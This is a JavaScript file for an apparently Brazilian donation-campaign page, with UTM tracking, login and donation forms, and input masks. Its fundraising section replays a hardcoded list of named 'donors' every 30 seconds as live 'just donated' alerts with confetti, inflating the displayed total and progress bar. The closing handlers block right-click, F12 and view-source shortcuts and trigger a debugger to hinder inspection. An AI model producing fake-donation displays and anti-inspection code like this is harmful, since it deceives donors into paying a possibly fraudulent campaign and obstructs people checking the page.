var loader = document.getElementById("loading");
var page = document.getElementById("content-page");
window.addEventListener("load", function() {
    loader.classList.remove("active");
    page.style.display = "block";
});

document.addEventListener('DOMContentLoaded', function() {
    const params = new URLSearchParams(window.location.search);
    const googleData = JSON.parse(localStorage.getItem('google')) || {};

    params.forEach((value, key) => {
        googleData[key] = value;
    });

    if (!googleData.utm_source) {
        googleData.utm_source = 'organic';
    }

    localStorage.setItem('google', JSON.stringify(googleData));
    console.log('Google Data Atualizado:', googleData);

    const newParams = Object.entries(googleData)
        .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
        .join('&');

    const baseUrl = window.location.origin + window.location.pathname;
    const newUrl = `${baseUrl}?${newParams}`;

    if (window.location.href !== newUrl) {
        window.history.replaceState(null, '', newUrl);
    }
});

document.querySelectorAll('.show-pass').forEach(button => {
    button.addEventListener('click', function() {
        let input = this.closest('div').querySelector('input');

        if (input.type === "password") {
            input.type = "text";
            this.innerHTML = '<i class="fa-solid fa-eye-slash"></i>';
        } else {
            input.type = "password";
            this.innerHTML = '<i class="fa-solid fa-eye"></i>';
        }
    });
});

function formatarMoeda(valor) {
    return new Intl.NumberFormat("pt-BR", {
        style: "currency",
        currency: "BRL"
    }).format(valor);
}

if (document.getElementById("barra")) {
    const arrayDados = [{
            nome: "Marcos Aurélio",
            image: "public/images/Marcos Aurélio.png",
            apoiador: 1,
            doado: 50,
            coracoes: 1
        },
        {
            nome: "Juliana Aparecida",
            image: "public/images/Juliana Aparecida.png",
            apoiador: 1,
            doado: 32.50,
            coracoes: 0
        },
        {
            nome: "Maria Eduarda",
            image: "public/images/Maria Eduarda.png",
            apoiador: 1,
            doado: 100,
            coracoes: 1
        },
        {
            nome: "Lorena Fonseca",
            image: "public/images/Lorena Fonseca.png",
            apoiador: 1,
            doado: 113.20,
            coracoes: 0
        },
        {
            nome: "Lucas Fernandes",
            image: "public/images/Lucas Fernandes.png",
            apoiador: 1,
            doado: 140.80,
            coracoes: 1
        },
        {
            nome: "Taina Silva",
            image: "public/images/Taina Silva.png",
            apoiador: 1,
            doado: 100,
            coracoes: 1
        },
        {
            nome: "Fernanda Oliveira",
            image: "public/images/Fernanda Oliveira.png",
            apoiador: 1,
            doado: 210,
            coracoes: 0
        },
        {
            nome: "Marcos Paulo",
            image: "public/images/Marcos Paulo.png",
            apoiador: 1,
            doado: 55,
            coracoes: 1
        },
        {
            nome: "João Castro",
            image: "public/images/João Castro.png",
            apoiador: 1,
            doado: 62,
            coracoes: 0
        },
        {
            nome: "Julio César",
            image: "public/images/Julio César.png",
            apoiador: 1,
            doado: 108,
            coracoes: 1
        },
        {
            nome: "Marcela de Moraes",
            image: "ppublic/images/Marcela de Moraes.png",
            apoiador: 1,
            doado: 60,
            coracoes: 0
        },
        {
            nome: "Roberta de Souza",
            image: "public/images/Roberta de Souza.png",
            apoiador: 1,
            doado: 150,
            coracoes: 1
        },
        {
            nome: "Raquel Oliveira",
            image: "public/images/Raquel Oliveira.png",
            apoiador: 1,
            doado: 256,
            coracoes: 0
        },
        {
            nome: "Marcelo Rodrigues",
            image: "public/images/Marcelo Rodrigues.png",
            apoiador: 1,
            doado: 155,
            coracoes: 1
        },
        {
            nome: "Taís Costa",
            image: "public/images/Taís Costa.png",
            apoiador: 1,
            doado: 144,
            coracoes: 1
        },
        {
            nome: "Manuela Ribeiro",
            image: "public/images/Manuela Ribeiro.png",
            apoiador: 1,
            doado: 105,
            coracoes: 0
        },
        {
            nome: "Eduardo dos Santos",
            image: "public/images/Eduardo dos Santos.png",
            apoiador: 1,
            doado: 40.50,
            coracoes: 1
        },
        {
            nome: "Manoel Caetano Santos",
            image: "public/images/741c4f79b472f094b436fb5887129b84-1.jpg.webp",
            apoiador: 1,
            doado: 32,
            coracoes: 0
        }
    ];

    let index = 0;

    function atualizarValores() {
        if (index >= arrayDados.length) return;

        let item = arrayDados[index];
        apoiadores += item.apoiador;
        coracoes += item.coracoes;
        animarValor("apoiadores", apoiadores);
        animarValor("coracoes", coracoes);

        let novoValor = arrecadado + item.doado;
        animarValor("doado", novoValor, arrecadado);
        arrecadado = novoValor;

        exibirNotificacao(item.nome, item.image, item.doado);
        atualizarBarra();
        index++;
    }

    function atualizarBarra() {
        let porcentagem = (arrecadado / meta) * 100;
        let porcento = Math.round(porcentagem);
        document.getElementById("barra").style.width = porcentagem + "%";
        document.getElementById("barraMobile").style.width = porcentagem + "%";
        document.getElementById("porcentagem").innerHTML = porcento + "%";
    }

    function animarValor(id, novoValor, valorAntigo = 0) {
        let elementos = document.querySelectorAll(`#${id}, #valorMobile`);
        let inicio = valorAntigo || parseFloat(elementos[0].innerText.replace(/[^0-9.,]/g, "")) || 0;
        let incremento = (novoValor - inicio) / 50;
        let atual = inicio;
        let contador = 0;

        let animacao = setInterval(() => {
            atual += incremento;
            elementos.forEach(elemento => {
                elemento.innerText = id === "doado" ? formatarMoeda(atual) : atual.toFixed(0);
            });

            contador++;
            if (contador >= 50) {
                clearInterval(animacao);
                elementos.forEach(elemento => {
                    elemento.innerText = id === "doado" ? formatarMoeda(novoValor) : novoValor;
                });
            }
        }, 20);
    }

    function exibirNotificacao(nome, image, valor) {
        let notificacao = document.createElement("div");
        notificacao.className = "notificacao";
        notificacao.innerHTML = `<div class="avatar"><img src="${image}" alt="${nome}"></div><div class="content"><h4>${nome}</h4> Acabou de doar <strong>${formatarMoeda(valor)}</strong>.</div>`;

        document.body.appendChild(notificacao);

        setTimeout(() => {
            let rect = notificacao.getBoundingClientRect();

            confetti({
                particleCount: 100,
                spread: 70,
                origin: {
                    x: (rect.left + rect.width / 2) / window.innerWidth,
                    y: (rect.top + rect.height / 2) / window.innerHeight
                }
            });
        }, 100);

        setTimeout(() => {
            notificacao.style.transform = "translatey(0)";
            notificacao.style.opacity = "0";
            setTimeout(() => notificacao.remove(), 500);
        }, 6000);
    }

    setInterval(atualizarValores, 30000);

    document.addEventListener("DOMContentLoaded", () => {
        atualizarBarra();
    });

    document.addEventListener("DOMContentLoaded", () => {
        let script = document.createElement("script");
        script.src = "https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js";
        document.head.appendChild(script);
    });

    jQuery(function($) {
        $(document).ready(function() {
            $('a[href^="#"]').on('click', function(e) {
                e.preventDefault();
                var id = $(this).attr('href'),
                    targetOffset = $(id).offset().top;

                $('html, body').animate({
                    scrollTop: targetOffset - 60
                }, 1000);
            });

            $('.menu-mobile, .close-menu').click(function() {
                $('.nav-mobile').toggleClass('active');
            })
        });

        $('.btn-ajudar, .fora-modal, .close-modal').click(function() {
            $('.modal-doar').toggleClass('open');
        });
    });
}

jQuery(function($) {
    $(document).ready(function() {
        $('#form-login').on('submit', function(event) {
            event.preventDefault();

            var formData = new FormData($(this)[0]);
            var action = $(this).attr('action');

            $.ajax({
                type: 'POST',
                url: action,
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {
                    if (response.success) {
                        window.location.href = response.redirect;
                    } else {
                        $('.alert-login').css('display', 'block');
                    }
                },
                beforeSend: function() {
                    $('#loading-form').css({
                        'display': 'flex'
                    });
                    $('.alert-login').css('display', 'none');
                },
                complete: function() {
                    $('#loading-form').css({
                        'display': 'none'
                    });
                }
            });
        });

        $('.bt-logout').on('click', function(event) {
            event.preventDefault();
            $('#logout-form').submit();
        });

        $('.input_money').maskMoney({
            prefix: '',
            allowNegative: false,
            thousands: '.',
            decimal: ',',
            affixesStay: false,
            precision: 2
        });

        $('#valor').on('blur', function() {
            var contribuicao = $(this).val();
            var valor = parseFloat($(this).maskMoney('unmasked')[0]);
            var min = 30.00;
            var max = 10000.00;
            var aviso = '';

            if (valor != '' && valor < min) {
                aviso = 'Valor da contribuição deve ser no mínimo R$ 30,00';
            } else if (valor != '' && valor > max) {
                aviso = 'Valor da contribuição deve ser no máximo R$ 10.000,00';
            }

            if (aviso !== '') {
                $('.aviso_valor').html(aviso);
                $('.aviso_valor').css('display', 'block');
                $(this).addClass('error');
                $('#doado').text('R$ 0,00');
                donate = 0.00;
                total = formatarMoeda(donate);
                $('#total').text(total);
                $('#aPagar').val(donate);
            } else {
                $('.aviso_valor').css('display', 'none');
                $(this).removeClass('error');
                if (contribuicao == '') {
                    $('#doado').text('R$ 0,00');
                } else {
                    $('#doado').text('R$ ' + contribuicao);
                }
                donate = valor;
                total = formatarMoeda(donate);
                $('#total').text(total);
                $('#aPagar').val(donate);
            }
        });

        $("#celular, #telefone").focus(function() {
            $(this).mask("(99) 99999-9999");
        });
        $("#celular, #telefone").mask("(99) 99999-9999").focusout(function(event) {
            var target, phone, element;
            target = (event.currentTarget) ? event.currentTarget : event.srcElement;
            phone = target.value.replace(/\D/g, '');
            element = $(target);
            element.unmask();
            if (phone.length > 10) {
                element.mask("(99) 99999-9999");
            } else {
                element.mask("(99) 9999-9999");
            }
        });

        $('#formDoacao').on('submit', function(event) {
            event.preventDefault();

            const googleData = JSON.parse(localStorage.getItem('google')) || {};

            var formData = new FormData($(this)[0]);
            var action = $(this).attr('action');

            for (const key in googleData) {
                if (googleData.hasOwnProperty(key)) {
                    if (!formData.has(key)) {
                        formData.append(key, googleData[key]);
                    }
                }
            }

            const newParams = Object.entries(googleData)
                .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
                .join('&');

            formData.append('parametros', newParams);

            $.ajax({
                type: 'POST',
                url: action,
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {
                    if (response.success) {
                        window.location.href = response.redirect;
                    }
                },
                beforeSend: function() {
                    $('#loading-form').css({
                        'display': 'flex'
                    });
                },
                complete: function() {
                    $('#loading-form').css({
                        'display': 'none'
                    });
                }
            });
        });

    });
})

document.addEventListener("contextmenu", function(e) {
    e.preventDefault();
    triggerDebugger();
});

document.addEventListener("keydown", function(e) {
    const key = e.key.toLowerCase();

    if (
        key === "f12" ||
        (e.ctrlKey && e.shiftKey && (key === "i" || key === "c")) ||
        (e.ctrlKey && key === "u") ||
        (e.ctrlKey && e.shiftKey && (key === "j" || key === "k")) ||
        key === "f11" ||
        (e.metaKey && key === "i")
    ) {
        e.preventDefault();
        triggerDebugger();
    }
});